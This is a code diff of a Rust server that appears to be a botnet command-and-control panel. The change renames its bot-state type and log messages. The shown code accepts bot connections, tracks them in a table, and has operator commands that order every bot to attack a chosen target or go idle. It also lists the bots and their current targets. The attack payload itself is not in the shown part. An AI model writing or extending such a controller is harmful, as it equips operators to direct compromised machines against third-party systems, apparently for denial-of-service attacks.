@@ -2,7 +2,7 @@ use std::{
     collections::HashMap, env, io::Write, net::SocketAddr, process, sync::{Arc, Mutex}, time::{Duration, SystemTime}
 };
 
-use astolfo::FemState;
+use astolfo::BotState;
 use tokio::{
     io::{self, AsyncBufReadExt, AsyncReadExt, AsyncWriteExt, BufReader},
     net::{TcpListener, TcpStream}, time::sleep,
@@ -10,7 +10,7 @@ use tokio::{
 
 #[derive(Debug)]
 struct Femboy {
-    state: FemState,
+    state: BotState,
     timestamp: SystemTime
 }
 
@@ -39,13 +39,13 @@ async fn main() {
                 process::exit(1);
             });
 
-        println!("[\x1b[94mINFO\x1b[0m] Listening for femboys on 0.0.0.0:{port}");
+        println!("[\x1b[94mINFO\x1b[0m] Listening for bots on 0.0.0.0:{port}");
 
         loop {
             let femboy = match listener.accept().await {
                 Ok((stream, addr)) => (stream, addr),
                 Err(err) => {
-                    println!("[\x1b[91mERR\x1b[0m] Failed to transition a femboy ({err})");
+                    println!("[\x1b[91mERR\x1b[0m] Failed to established connection to bot ({err})");
                     continue;
                 }
             };
@@ -57,7 +57,7 @@ async fn main() {
 
                 femtable.insert(
                     femboy.1,
-                    Femboy { state: FemState::Idle, timestamp: SystemTime::now() }
+                    Femboy { state: BotState::Idle, timestamp: SystemTime::now() }
                 );
 
             }
@@ -87,7 +87,7 @@ async fn main() {
                 ""
             });
 
-            if command == "femboys" {
+            if command == "bots" {
                 let femtable = femtable.lock().unwrap_or_else(|_| {
                     process::exit(1);
                 });
@@ -99,7 +99,7 @@ async fn main() {
                 if let Some(target) = target {
                     let mut table = command_femtable.lock().unwrap();
                     for (_,v) in table.iter_mut() {
-                        v.state = FemState::Attacking(target.to_owned());
+                        v.state = BotState::Attacking(target.to_owned());
                     }
 
                     println!("[\x1b[92mSUCC\x1b[0m] Set bot(s) to attack mode, target {target}");
@@ -111,7 +111,7 @@ async fn main() {
             else if command == "stop" {
                 let mut table = command_femtable.lock().unwrap();
                 for (_,v) in table.iter_mut() {
-                    v.state = FemState::Idle;
+                    v.state = BotState::Idle;
                 }
                 println!("[\x1b[92mSUCC\x1b[0m] Set bot(s) to idle mode");
             }
@@ -207,8 +207,8 @@ async fn handle_femboy(femtable: BotTable, addr: SocketAddr, mut stream: TcpStre
 fn display_table(femtable: &HashMap<SocketAddr, Femboy>) {
     for (k,v) in femtable.iter() {
         match v.state {
-            FemState::Idle => println!("\x1b[92m●\x1b[0m {k} Idle"),
-            FemState::Attacking(ref addr) => println!("\x1b[91m●\x1b[0m {k} Attacking -> {addr}"),
+            BotState::Idle => println!("\x1b[92m●\x1b[0m {k} Idle"),
+            BotState::Attacking(ref addr) => println!("\x1b[91m●\x1b[0m {k} Attacking -> {addr}"),
             _ => {}
         }
     }
